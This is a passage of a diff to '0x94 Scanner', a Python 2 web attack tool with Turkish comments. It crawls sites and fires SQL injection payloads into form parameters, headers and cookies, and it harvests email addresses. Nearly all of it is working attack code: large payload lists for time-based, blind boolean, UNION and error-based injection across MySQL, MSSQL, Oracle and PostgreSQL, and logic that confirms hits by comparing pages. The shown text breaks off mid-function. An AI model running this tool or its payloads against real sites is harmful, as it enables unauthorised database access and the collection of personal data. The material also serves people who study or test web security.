@@ -1,19 +1,23 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
-# 0x94 Scanner"
-#Multi Thread(POST/GET/BLIND/TIME BASED/HEADER/SQL SCAN) -LFI-XSS SCAN"
+# 0x94 Scanner v1.0
+#Multi Thread  POST|GET (BLIND/TIME BASED/HEADER/SQL) INJECTION - LFI -XSS SCANNER"
 #Sunucu IP adresi ve kullanilan http bilgisini alir
 #Sunucu Allow header listesini alir
-#Sitedeki tum linkleri 2 farkli yontemle alir
-#seo ile yada 302 yonlendirmeli linklerin location urllerini otomatik alir
+#Sitedeki tum linkleri 2 farkli yontemle alir (ayni linkleri tarayip zaman kaybi yapmaz)
+#seo ile yada 302 yonlendirmeli linklerin location urllerini otomatik alir (otomatik yonlendirme aktiftir)
 #tum linklerde get ve post sql injection dener
 #tum linklerde blind get ve post sql injection dener
-#tum linklerde time based sql injection dener
+#tum linklerde time based get ve post sql injection dener
 #tum linklerde header injection dener
 #sayfada herhangi bir degisme oldugunda degisme satirini ekrana yazar
-#tum linklerde xss dener
+#tum linklerde xss dener / bulunan xss satirinda code / noscript var ise belirtir
 #tum linklerde lfi dener
 #cookie ve proxy destegide vardir.
+#ajax ile veri gonderimi olan dosyalari tespit eder
+#sitede gecen emailleri otomatik toplar
+#calismayan php ve asp kodlarini bulur
+#bulunan sql aciklarinin yollanan verilerin true ve false deger ciktilarini /debug klasorune kaydeder.
 #butun sonuclari rapor.txt ye kaydeder
 #sadece guvenlik testleri icin kullanin
 #Turk sitelerinde tarama yapmaz.
@@ -32,13 +36,29 @@ import socket
 import Queue
 import threading
 from time import sleep
-
+import random
+import os
+import sre
 
 #cookie ayarlamak istiyorsan buraya gir
-sayfacookie="lalala"
+sayfacookie="ben=0x940x94"
+
+#sunucuda request limit varsa burayi doldurun
+reqbeklemesuresi=1
+
+
+
 queue = Queue.Queue()
+yedekq = Queue.Queue()
+
+
+if not os.path.exists("./debug"):
+    os.makedirs("./debug")
 
 from BeautifulSoup import BeautifulSoup
+
+
+
 
 class HTTPAYAR(urllib2.HTTPRedirectHandler):
     
@@ -60,6 +80,7 @@ opener.addheaders = [
 
 urllib2.install_opener(opener)
 aynilinkler={}
+limitlinkler={}
 
 def yaz(yazi,ekran):
     dosya=open("rapor.txt","a+")
@@ -67,16 +88,21 @@ def yaz(yazi,ekran):
     dosya.close()
     if ekran==True:
 	print yazi
+	
     
+def Debugyaz(isim,yazi):
+    dosya=open(isim,"w")
+    dosya.write(yazi+"\n")
+    dosya.close()
     
-
 def formyaz(formurl):  
 
-    toplamveri={}   
-    
-    html = urllib2.urlopen(formurl).read() 
-    soup = BeautifulSoup(html)  
     try:
+	toplamveri={}   
+	
+	html = urllib2.urlopen(formurl).read() 
+	soup = BeautifulSoup(html)  
+    
 	forms=soup.findAll("form")        
 	for form in forms:  
 	    if form.has_key('action'):  
@@ -88,39 +114,42 @@ def formyaz(formurl):
 	    else:  
 		print "action: " + formurl  	
 	    if form.has_key('method') and form['method'].lower() == 'post': 
-		    yaz("[POST] action " +formurl,False)
+		    print "[POST] action " +formurl
 		    for post_inputselect in form.findAll("select"):
 			    print post_inputselect['name']
-			    toplamveri[post_inputselect['name']]="bekir"	
+			    toplamveri[post_inputselect['name']]=""	
 		    
 		    for post_input in form.findAll("input"):  
-			    if post_input.has_key('type'):  
+			    if post_input.has_key('type'): 
+				if post_input['type'].lower() == 'file':
+				    yaz(" [#] Dosya Upload Alani Bulundu "+formurl,True)
 				if post_input['type'].lower() == 'text' or post_input['type'].lower() == 'password' or   post_input['type'].lower() == 'hidden' or post_input['type'].lower() == 'radio':  
 					if post_input.has_key('id'):  
 						print post_input['id']
 						if post_input.has_key('value'):
 						    toplamveri[post_input['id']]=post_input['value']
 						else:
-						    toplamveri[post_input['id']]="bekir"
+						    toplamveri[post_input['id']]=""
 					elif post_input.has_key('name'):
 					    print post_input['name']
 					    if post_input.has_key('value'):
 						toplamveri[post_input['name']]=post_input['value']
 					    else:
-						toplamveri[post_input['name']]="bekir"
+						toplamveri[post_input['name']]=""
     
 						
 						
 		    
 		    postget(formurl, toplamveri,"POST")
 		    blindpost(formurl, toplamveri,"POST")
+		    posttimebased(formurl, toplamveri,"POST")
 			
 	    if form.has_key('method') and form['method'].lower() == 'get' or not form.has_key('method'):  
 		print "[GET] action " +formurl
 		for get_inputselect in form.findAll("select"):
 		    if get_inputselect.has_key("name"):
 			    print get_inputselect['name']
-			    toplamveri[get_inputselect['name']]="bekir"
+			    toplamveri[get_inputselect['name']]=""
 			    
 		
 		for get_input in form.findAll("input"):                         
@@ -131,18 +160,27 @@ def formyaz(formurl):
 					    if post_input.has_key('value'):
 						toplamveri[post_input['id']]=post_input['value']
 					    else:
-						toplamveri[post_input['id']]="bekir"					    
-					    toplamveri[post_input['id']]="bekir"
+						toplamveri[post_input['id']]=""					    
+					    toplamveri[post_input['id']]=""
 				    elif get_input.has_key('name'):
 					    print get_input['name']
 					    if get_input.has_key('value'):
 						toplamveri[get_input['name']]=get_input['value']
 					    else:
-						toplamveri[get_input['name']]="bekir"
+						toplamveri[get_input['name']]=""
 		postget(formurl, toplamveri,"GET")
 		blindpost(formurl, toplamveri,"GET")
+		posttimebased(formurl, toplamveri,"GET")
+		
+    except urllib2.HTTPError,  e:
+	mesaj="hata"
+
+    except urllib2.URLError,  e:
+	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlnormal)
+	#yaz(mesaj)
     except:
-	print "Form Degerlerini Alirken Hata olustu"
+	mesaj="Bilinmeyen hata olustu\n"
+	#yaz(mesaj)   
 
 
 
@@ -153,13 +191,13 @@ def cookieinjection(url,cookie):
 	opener.addheaders = [("User-agent", "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20100101 Firefox/21.0'"),
 	                     ("X-Forwarded-For", "127.0.0.1'"),
 	                     ("Referer", "http://www.site.com'"),
-	                     ("Cookie", cookie.replace("=","'="))]
+	                     ("Cookie", cookie.replace("=","='"))]
 	response = opener.open(url)
-	sqlkontrol(response,"[Cookie INJECTION]"+url)
+	sqlkontrol(temizle(response),"[Cookie INJECTION]"+url)
 	
     except urllib2.HTTPError,  e:
 	    if(e.code==500):
-		yaz("[#] Cookie Injection Http 500 Dondu  / Internal Server Error \n "+cookie.replace("=","'=")+"\n" +url,True)
+		yaz("[#] Cookie Injection Http 500 Dondu  / Internal Server Error \n "+cookie.replace("=","='")+"\n" +url,True)
 		
     except urllib2.URLError,  e:
 	if "Time" in e.reason:
@@ -169,6 +207,26 @@ def cookieinjection(url,cookie):
 	mesaj="Bilinmeyen hata olustu\n"
 	    #yaz(mesaj)           
     
+def normalac(url):
+    ajaxtespit=["jquery.ajax","$.ajax"]
+    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(),urllib2.HTTPSHandler())    
+    opener.addheaders = [("User-agent", "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20100101 Firefox/21.0")]
+    response = opener.open(url).read().lower()
+    
+    list=sre.findall("([0-9a-z\-_\.]+\@[0-9a-z\-_\.]+\.[0-9a-z\-_\.]+)",response)
+    if len(list)>0:
+	yaz("[#] Email Tespit Edildi "+url+"\n"+str(list),True)
+	    
+    for ajx in ajaxtespit:
+	if ajx in temizle(response):
+	    yaz("[#] Ajax Tespit Edildi "+url,True)
+    if "<?" in response and "?>" in response:
+	yaz("[#] PHP kod tespit Edildi "+url,True)
+    elif "<%" in response and "%>" in response:
+	yaz("[#] ASP kod tespit Edildi "+url,True)
+    
+    
+	
 
 def headerinjection(url):
     try:
@@ -182,7 +240,7 @@ def headerinjection(url):
 	headers = response.info()
 	yollanacakcookie=headers['Set-Cookie']
 	cookieinjection(url, yollanacakcookie)
-	sqlkontrol(response,"[Header INJECTION]"+url)
+	sqlkontrol(temizle(response.read()),"[Header INJECTION]"+url)
 	
     except urllib2.HTTPError,  e:
 	    if(e.code==500):
@@ -196,43 +254,134 @@ def headerinjection(url):
 	mesaj="Bilinmeyen hata olustu\n"
 	    #yaz(mesaj)           
 
+
+def posttimebased(url,params,method):
     
+    timesql=[" WAITFOR DELAY '0:0:50';--",
+             "'+(SELECT 1 FROM (SELECT SLEEP(50))A)+'",
+             "1') AND SLEEP(50) AND ('LoUL'='LoUL",
+             "' WAITFOR DELAY '0:0:50' and 'a'='a;--",
+             "' and  sleep(50) and  'a'='a",
+             "' WAITFOR DELAY '0:0:50';--",
+             " IF 1=1 THEN dbms_lock.sleep(50);",
+             " ' IF 1=1 THEN dbms_lock.sleep(50);",
+             " ' WAITFOR DELAY '0:0:50';--",
+             "; SLEEP(50)",
+             " SLEEP(50)",
+             "' SLEEP(50)--",
+             "' SLEEP(50)",
+             " pg_sleep(50)",
+             " ' pg_sleep(50)",
+             " PG_DELAY(50)",
+             " ' PG_DELAY(50)",
+             " and if(substring(user(),1,1)>=chr(97),SLEEP(50),1)--",
+             " ' and if(substring(user(),1,1)>=chr(97),SLEEP(50),1)--",
+             " DBMS_LOCK.SLEEP(50);",
+             " AND if not(substring((select @version),25,1) < 52) waitfor delay  '0:0:50'--"]
+
+	
+    postgetdict={}
+    postgetdict=params.copy()
+    
+    for timeler in timesql:
+	for key,value in params.items():		
+	    if key in postgetdict:
+		postgetdict[key]=value+timeler
+		try:
+		    parametresaf = urllib.urlencode(postgetdict)
+		    if method=="GET":
+			print "Time Based GET SQL testi yapiliyor"
+			y11 = temizle(urllib.urlopen(url+"?"+parametresaf,timeout=40).read())
+			postgetdict.clear()
+			postgetdict=params.copy()
+				
+		    else:
+			print "Time Based POST SQL testi yapiliyor"
+			y11 = temizle(urllib2.urlopen(url, parametresaf,timeout=40).read())
+			postgetdict.clear()
+			postgetdict=params.copy()
+		    sqlkontrol(y11,"[#] POST DA SQL ERROR BULUNDU / \nVERISI = "+parametresaf+"\n URL = "+url)
+		  
+
+    
+		except urllib2.HTTPError,e:
+		    print e.reason
+		    if(e.code==500):
+			yaz("[#] "+method+" Time Based Injection Http 500 Dondu  Internal Server Error "+timeler+" \n" +url,True)
+			
+		except socket.timeout:
+		    yaz("[#] URL= "+url+"\n"+method+" Time BASED SQL BULUNDU \n TIME BASED VERISI\n\n = "+parametresaf,True)
+		    
+		except urllib2.URLError,  e:
+		    if "Time" in e.reason:
+			mesaj="Time BASED SQL Olabilir Cunku Cok bekledi =  %s , %s \n" %(url,timeler)
+			yaz(mesaj,True)
+		except:
+		    mesaj="Bilinmeyen hata olustu\n"
+		    #yaz(mesaj)       
+	    
 
 							
 def timebased(url):
+    
     timesql=[" WAITFOR DELAY '0:0:50';--",
+             "1') AND SLEEP(50) AND ('LoUL'='LoUL",
+             "' WAITFOR DELAY '0:0:50' and 'a'='a;--",
+             "' and  sleep(50) and  'a'='a",
+             "' WAITFOR DELAY '0:0:50';--",
              " IF 1=1 THEN dbms_lock.sleep(50);",
-             " 'IF 1=1 THEN dbms_lock.sleep(50);",
-             " 'WAITFOR DELAY '0:0:50';--",
+             " ' IF 1=1 THEN dbms_lock.sleep(50);",
+             " ' WAITFOR DELAY '0:0:50';--",
+             "; SLEEP(50)",
              " SLEEP(50)",
-             " 'SLEEP(50)",
+             "' SLEEP(50)--",
+             "' SLEEP(50)",
              " pg_sleep(50)",
-             " 'pg_sleep(50)",
+             " ' pg_sleep(50)",
              " PG_DELAY(50)",
-             " 'PG_DELAY(50)",
+             " ' PG_DELAY(50)",
              " and if(substring(user(),1,1)>=chr(97),SLEEP(50),1)--",
-             " 'and if(substring(user(),1,1)>=chr(97),SLEEP(50),1)--",
+             " ' and if(substring(user(),1,1)>=chr(97),SLEEP(50),1)--",
              " DBMS_LOCK.SLEEP(50);",
              " AND if not(substring((select @version),25,1) < 52) waitfor delay  '0:0:50'--"]
     
     for timeler in timesql:
 	try:
-	    print "Time Based SQL Test Yapiliyor ... "
-	    urlnormal=url.replace("=", "="+urlencode(parse_qsl(timeler)))
-	    urlac = urllib2.urlopen(urlnormal,timeout=40)
-	    response = urlac.read()
-	    sqlkontrol(response,urlnormal)
+	    yenitime={}
+	    #yenipath=""
+	    for key,value in urlparse.parse_qs(urlparse.urlparse(url).query, True).items():
+		yenitime[key]=value[0]+timeler
+		#yenipath+="?"+key+"="+value[0]
+	    
+	    host=urlparse.urlparse(url).netloc
+	    dosya=urlparse.urlparse(url).path
+	    #yeniurl="http://"+host+dosya+yenipath
+	    
+	    
+		
+	    #query=urlparse.urlparse(url+"&").query
+	    #r = re.compile('=(.*?)&')
+	    #m = r.search(query)
+	    #if m:
+		#print m.group(1)
+	                      
+	    print "Time Based SQL Test Yapiliyor ... "+timeler
+	    encoded_args = urllib.urlencode(yenitime)
+	    responsex = urllib2.urlopen("http://"+host+dosya+"?"+encoded_args,timeout=40)
+	    responsey = temizle(responsex.read())
+	    sqlkontrol(responsey,"[#] SQL ERROR BULUNDU / VERISI = "+timeler+"\n URL = "+url)
 		
 	except urllib2.HTTPError,  e:
+	    print e.reason
 	    if(e.code==500):
-		yaz("[#] Timebased Injection Http 500 Dondu  Internal Server Error "+timeler+" \n" +urlnormal,True)
+		yaz("[#] Timebased Injection Http 500 Dondu  Internal Server Error "+timeler+" \n" +url,True)
 		
 	except socket.timeout:
-	    yaz("[#] Time BASED SQL Olabilir Cok fazla bekledi",True)
+	    yaz("[#] Time BASED SQL BULUNDU \n TIME BASED VERISI = "+"http://"+host+dosya+"?"+timeler,True)
 	    
 	except urllib2.URLError,  e:
 	    if "Time" in e.reason:
-		mesaj="Time BASED SQL Olabilir Cunku Cok bekledi =  %s , %s \n" %(urlnormal,timeler)
+		mesaj="Time BASED SQL Olabilir Cunku Cok bekledi =  %s , %s \n" %(url,timeler)
 		yaz(mesaj,True)
 	except:
 	    mesaj="Bilinmeyen hata olustu\n"
@@ -240,121 +389,254 @@ def timebased(url):
 
 
 def blindpost(url,params,method):
-    
-    try:
-	
-	degisecekdict={} 
-	for k,v in params.items():
-	    #print k,v
-	    degisecekdict[k]=v
+ 
+   
+    #try:
+	#normaldict={}
+	#for key,value in params.items():
+	    #if value=="":
+		#value="0x94"
+	    #normaldict[key]=value+"0x94"
 	    
+	#parametresaf = urllib.urlencode(normaldict)
+	#if method=="GET":
+	    #print "Normal Blind GET SQL testi yapiliyor"
+	    #normalkaynak = temizle(urllib.urlopen(url+"?"+parametresaf).read())	    
+	#else:
+	    #print "Normal Blind POST SQL testi yapiliyor"
+	    #normalkaynak = temizle(urllib2.urlopen(url, parametresaf).read())
+	    
+    #except urllib2.HTTPError,  e:
+	#if(e.code==500):
+	    #yaz("[#] BLIND "+method+" Http 500 Dondu  / Internal Server Error "+url+"\n Yollanan Data ="+parametresaf,True)
 	
-	parametresaf = urllib.urlencode(params)
-	if method=="GET":
-	    print "Blind GET SQL testi yapiliyor"
-	    y = urllib.urlopen(url+"?"+parametresaf)
-	else:
-	    print "Blind POST SQL testi yapiliyor"
-	    y = urllib2.urlopen(url, parametresaf)
-	
-    except urllib2.HTTPError,  e:
-	if(e.code==500):
-	    yaz("[#] BLIND "+method+" Http 500 Dondu  / Internal Server Error "+urlnormal+"\n Yollanan Data ="+parametresaf,True)
-	
-    except urllib2.URLError,  e:
-	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlnormal)
-		#yaz(mesaj)
-    except:
-	mesaj="Bilinmeyen hata olustu\n"    
-
+    #except urllib2.URLError,  e:
+	#mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,url)
+		##yaz(mesaj)
+    #except:
+	#mesaj="Bilinmeyen hata olustu\n"    
     
+   
+    post_string	= [" 'aNd 1=1",
+	                    "' anD 1=1",
+	                    "' and 1=(select 1)+'",
+	                    "'+(SELECT 1)+'",
+	                    "'+(SELECT 999999)+'",
+	                    "' OR 'bk'='bk",
+	                    "bekir' AND 'a'='a",
+	                    "' select dbms_xmlgen.getxml('select \"a\" from sys.dual') from sys.dual;",
+	                    "' select+dbms_pipe.receive_message((chr(95)||chr(96)||chr(97))+from+dual)",
+	                    " SELECT CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)",
+	                    "' SELECT CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)",                    
+	                    "' or''='",
+	                    "bekir 'or''='",
+	                    "' and 1=1",
+	                    "' and 1=1 'a'='a",
+	                    "' and 1=1 'a'='a",
+	                    "' aNd 1=2",
+	                    "' aNd 1=MID((database()),1,1)>1",
+	                    "' aNd 2=MID((@@version,1,1)--+",
+	                    "' aNd 3=MID((@@version,1,1)--+",
+	                    "' aNd 4=MID((@@version,1,1)--+",
+	                    "' aNd 5=MID((@@version,1,1)--+",
+	                    "' or 1=1 --",
+	                    "a' or 1=1 --",
+	                    "' or 1=1 #",
+	                    "or 1=1 --",
+	                    "') or ('x'='x",
+	                    "or username LIKE '%a%",
+	                    "' or username LIKE '%a%",
+	                    "' HAVING 1=1--",
+	                    "' and+1=convert(int,@@version)",
+	                    "' or 1=utl_inaddr.get_host_address((select banner from v$version where rownum=1))--",
+	                    "'a' || 'b' ",
+	                    "' SELECT IF(1=1,'true','false')",
+	                    "') or ('1'='1--",
+	                    "' GROUP BY 99999",
+	                    "if(true=false,1,SLEEP(5))--+",
+	                    "and+if(true%21=true,1,SLEEP(5))--+",
+	                    "and+if(1=2,1,SLEEP(5))--+",
+	                    "if(1%21=1,1,SLEEP(5))--+",
+	                    "if(true=true,1,SLEEP(5))--+",
+	                    "if(2=2,1,SLEEP(5))--+",
+	                    "and+true=false--+",
+	                    "and+false%21=false--+",
+	                    "and(select+1+from(select+count(*),floor(rand(0)*2)from+information_schema.tables+group+by+2)a)--+",
+	                    "union+select+1,(select+concat(0x53514c69,mid((concat(hex(concat_ws(0x7b257d,version(),database(),user(),CURRENT_USER)),0x69)),1,65536))),1,1--+",
+	                    "' if(true=false,1,SLEEP(5))--+",
+	                    "' and+if(true%21=true,1,SLEEP(5))--+",
+	                    "' and+if(1=2,1,SLEEP(5))--+",
+	                    "' if(1%21=1,1,SLEEP(5))--+",
+	                    "' if(true=true,1,SLEEP(5))--+",
+	                    "' if(2=2,1,SLEEP(5))--+",
+	                    "' and+true=false--+",
+	                    "' and+false%21=false--+",
+	                    "' and(select+1+from(select+count(*),floor(rand(0)*2)from+information_schema.tables+group+by+2)a)--+",
+	                    "' union+select+1,(select+concat(0x53514c69,mid((concat(hex(concat_ws(0x7b257d,version(),database(),user(),CURRENT_USER)),0x69)),1,65536))),1,1--+"] 	
     
+    bitiskarakter=["","--","/*","--+",";",";--","--","#"]
     
-    post_string	=  [" 'aNd 1=1",
+    #true_strings=["' OR 'bk'='bk"]
+    #false_strings=["' OR 'bk'='bk1111"]
+    
+    true_strings = ["' or 1=1",
+                    "')'a'='a'",
+                    "')'a'='a",
+                    "'or 'a'='a'",
                     "bekir' AND 'a'='a",
-                    "' select dbms_xmlgen.getxml(‘select “a” from sys.dual’) from sys.dual;",
-                    "' select+dbms_pipe.receive_message((chr(95)||chr(96)||chr(97))+from+dual)",
-                    " SELECT CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)",
-		    " 'SELECT CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)||CHR(77)||CHR(75)||CHR(76)",                    
-                    " 'or''='",
-                    " bekir 'or''='",
+                    "' OR 'bk'='bk",
+                    "' and 1=(select 1)+'",
+                    "' aNd 1=1",
                     " and 1=1",
-                    " and 1=1 'a'='a",
-                    " 'and 1=1 'a'='a",
-		    " 'aNd 1=2",
-                    " ' aNd 1=MID((database()),1,1)>1",
-		    " ' aNd 2=MID((@@version,1,1)--+",
-		    " ' aNd 3=MID((@@version,1,1)--+",
-		    " ' aNd 4=MID((@@version,1,1)--+",
-		    " ' aNd 5=MID((@@version,1,1)--+",
-		    " ' or 1=1 --",
-                    " a' or 1=1 --",
-                    " ' or 1=1 #",
-                    " or 1=1 --",
-                    " ') or ('x'='x",
-                    " or username LIKE '%a%",
-                    " 'or username LIKE '%a%",
-                    " 'HAVING 1=1--",
-                    " ' and+1=convert(int,@@version)",
-                    " ' or 1=utl_inaddr.get_host_address((select banner from v$version where rownum=1))--",
-                    " 'a' || 'b' ",
-                    " ' SELECT IF(1=1,'true','false')",
-                    " ') or ('1'='1--",
-                    " 'GROUP BY 99999",
-                    " if(true=false,1,SLEEP(5))--+"
-                    " and+if(true%21=true,1,SLEEP(5))--+",
-                    " and+if(1=2,1,SLEEP(5))--+",
-                    " if(1%21=1,1,SLEEP(5))--+",
-                    " if(true=true,1,SLEEP(5))--+",
-                    " if(2=2,1,SLEEP(5))--+",
-                    " and+true=false--+",
-                    " and+false%21=false--+",
-                    " and(select+1+from(select+count(*),floor(rand(0)*2)from+information_schema.tables+group+by+2)a)--+",
-                    " union+select+1,(select+concat(0x53514c69,mid((concat(hex(concat_ws(0x7b257d,version(),database(),user(),CURRENT_USER)),0x69)),1,65536))),1,1--+",
-                    " 'if(true=false,1,SLEEP(5))--+",
-                    " 'and+if(true%21=true,1,SLEEP(5))--+",
-                    " 'and+if(1=2,1,SLEEP(5))--+",
-                    " 'if(1%21=1,1,SLEEP(5))--+",
-                    " 'if(true=true,1,SLEEP(5))--+",
-                    " 'if(2=2,1,SLEEP(5))--+",
-                    " 'and+true=false--+",
-                    " 'and+false%21=false--+",
-                    " 'and(select+1+from(select+count(*),floor(rand(0)*2)from+information_schema.tables+group+by+2)a)--+",
-                    " 'union+select+1,(select+concat(0x53514c69,mid((concat(hex(concat_ws(0x7b257d,version(),database(),user(),CURRENT_USER)),0x69)),1,65536))),1,1--+"] 
+                    " ' and 1=1",
+                    " and 'a'='a",
+                    "' and 'a'='a",
+                    "' and 'a'='a",
+                    " and 1 like 1",
+                    " and 1 like 1/*",
+                    " and 1=1--",
+                    " group by 1",
+                    "'+(SELECT 1)+'",
+                    "' and 1=(select 1)+'",
+                    "'+aNd+10>1"]    
     
-    for postsql in post_string:
-	postgetdict={}
-	postgetdict=params.copy()
-		
-	for key,value in params.items():
-	    if key in postgetdict:
-		postgetdict[key]=value+postsql	    
-		try:
-		    parametre = urllib.urlencode(postgetdict)
-		    if method=="GET":
-			print "Blind GET SQL testi yapiliyor" 
-			f = urllib.urlopen(url+"?"+parametre)
-		    else:
-			print "Blind POST SQL testi yapiliyor"
-			f = urllib2.urlopen(url, parametre)
-		    postgetdict.clear()
-		    postgetdict=params.copy()
-		    
-		except urllib2.HTTPError,  e:
-		    if(e.code==500):
-			yaz("[#] BLIND "+method+" Http 500 Dondu  / Internal Server Error \n Yollanan Data = "+parametre+"\n"+url,True)
-		    
-		except urllib2.URLError,  e:
-		    mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,url)
-			    #yaz(mesaj)
-		except:
-		    mesaj="Bilinmeyen hata olustu\n"
-			    #yaz(mesaj)   
+    false_strings =["' or 1=2",
+                    "')'a'='b'",
+                    "')'a'='b",
+                    "'or 'a'='b'",
+                    "bekir' AND 'a'='b",
+                    "' OR 'bk'='bekir",
+                    "' and 1=(select 999999)+'",
+                    "' aNd 1=2",
+                    " and 1=2",
+                    " ' and 1=2",
+                    " and 'a'='b",
+                    "' and 'a'='b",
+                    "' and 'a'='b",
+                    " and 1 like 2",
+                    " and 1 like 2/*",
+                    " and 1=2--",
+                    " group by 99999",
+                    "'+(SELECT 99999)+'",
+                    "' and 1=(select 2)+'",
+                    "'+aNd+10>20"]	
+    for sonkarakter in bitiskarakter:
+	iyy = 0
+	while iyy < len(true_strings):
 	    
-		comparePages(y.read(),f.read(),f.geturl(),"[#] BLind "+method+" Sayfada Degisiklik oldu %s !!![+]" % f.geturl()+"\nPOST DATASI---------------------------\n"+parametre+"\nYollanan Veri ="+postsql+"\n")	
+	    
+		normaldict={}
+		truedict={}
+		falsedict={}
+		normaldict=params.copy()	
+		truedict=params.copy()
+		falsedict=params.copy()
+	    
+		
+		
+		for key,value in params.items():
+		    normalkaynak=""
+		    if key in normaldict:
+			if value=="":
+			    value="0x94"
+			normaldict[key]=value
+			print "POST Normal Deneniyor..."
+			parametresafn = urllib.urlencode(normaldict)
+			if method=="GET":
+			    print "Blind Normal GET SQL testi yapiliyor"
+			    normalkaynak = temizle(urllib.urlopen(url+"?"+parametresafn).read())
+			    
+			    normaldict.clear()
+			    normaldict=params.copy()				    
+			else:
+			    print "Blind Normal POST SQL testi yapiliyor"
+			    normalkaynak = temizle(urllib2.urlopen(url, parametresafn).read())
+			    normaldict.clear()
+			    normaldict=params.copy()
+			
+		#-----------------------------------------------------------------------------------		
+		    if key in truedict:
+			print "POST True Deneniyor: "+true_strings[iyy]+sonkarakter
+			if value=="":
+			    value="0x94"
+			truedict[key]=value+true_strings[iyy]+sonkarakter
+			try:
+			    parametresaft = urllib.urlencode(truedict)
+			    if method=="GET":
+				print "Blind GET SQL testi yapiliyor"
+				truekaynak = temizle(urllib.urlopen(url+"?"+parametresaft).read())
+				truedict.clear()
+				truedict=params.copy()			    
+			    else:
+				print "Blind POST SQL testi yapiliyor"
+				truekaynak = temizle(urllib2.urlopen(url, parametresaft).read())
+				truedict.clear()
+				truedict=params.copy()
+			    sqlkontrol(truekaynak,method+" "+url)
+    
+				
+			except urllib2.HTTPError,  e:
+			    if(e.code==500):
+				yaz("[#] BLIND "+method+" Http 500 Dondu  / Internal Server Error "+url+"\n Yollanan Data ="+parametresaft,True)
+			    
+			except urllib2.URLError,  e:
+			    mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,url)
+				    #yaz(mesaj)
+			except:
+			    mesaj="Bilinmeyen hata olustu\n"  
+			    
+			    
+			if key in falsedict:
 
+			    print "POST False Deneniyor: "+false_strings[iyy]+sonkarakter
+			    if value=="":
+				value="0x94"
+			    falsedict[key]=value+false_strings[iyy]+sonkarakter	
+			    try:
+				parametresaff = urllib.urlencode(falsedict)
+				if method=="GET":
+				    print "Blind GET SQL testi yapiliyor"
+				    falsekaynak = temizle(urllib.urlopen(url+"?"+parametresaff).read())
+				    
+				    falsedict.clear()
+				    falsedict=params.copy()				    
+				else:
+				    print "Blind POST SQL testi yapiliyor"
+				    falsekaynak = temizle(urllib2.urlopen(url, parametresaff).read())
+				    falsedict.clear()
+				    falsedict=params.copy()	
+				    
+				sqlkontrol(falsekaynak,method+" SQL INJECTION "+url+"\n Yollanan Veri="+parametresaff)
+	
+	    
+				
+			    except urllib2.HTTPError,  e:
+				if(e.code==500):
+				    yaz("[#] BLIND "+method+" Http 500 Dondu  / Internal Server Error "+url+"\n Yollanan Data ="+parametresaff,True)
+				
+			    except urllib2.URLError,  e:
+				mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,url)
+					#yaz(mesaj)
+			    except:
+				mesaj="Bilinmeyen hata olustu\n"  		    
+			    #if (comparePages(truekaynak,normalkaynak,url," BLIND ") > comparePages(truekaynak,falsekaynak,url," BLIND ")):
+    
+			    if normalkaynak==falsekaynak:
+				if truekaynak!=falsekaynak:
+				    
+				    comparePages(truekaynak,falsekaynak,url,"\n\n [#]  POST SQL INJECTION BULUNDU URL = "+url+" \n\n TRUE Yollanan Veri="+parametresaft+"\n\n FALSE Yollanan Veri="+parametresaff)
+		
+
+				    #comparePages(truekaynak,falsekaynak,url,"\n\n [#]  POST SQL INJECTION BULUNDU URL = "+url+" \n\n TRUE Yollanan Veri="+parametresaft+"\n\n FALSE Yollanan Veri="+parametresaff)
+				    debug=1
+			    #comparePages(y1kaynak,y2kaynak,url,"[#] BLind "+method+" Sayfada Degisiklik oldu  !!![+]"+url+"\nYollanan Veri ="+false_strings[iyy]+sonkarakter+"\n")	
+			    iyy=iyy+1 
+			    
+	
+		
 
 def postget(url, params, method):
+
     try:
 	
 	postgetdict={}
@@ -363,7 +645,7 @@ def postget(url, params, method):
 	for key,value in params.items():
 	    if key in postgetdict:
 		
-		postgetdict[key]=value+"'a"
+		postgetdict[key]=value+"'"
 		parametre = urllib.urlencode(postgetdict)
 		if method=="GET":
 		    print "GET SQL testi yapiliyor"
@@ -371,7 +653,7 @@ def postget(url, params, method):
 		else:
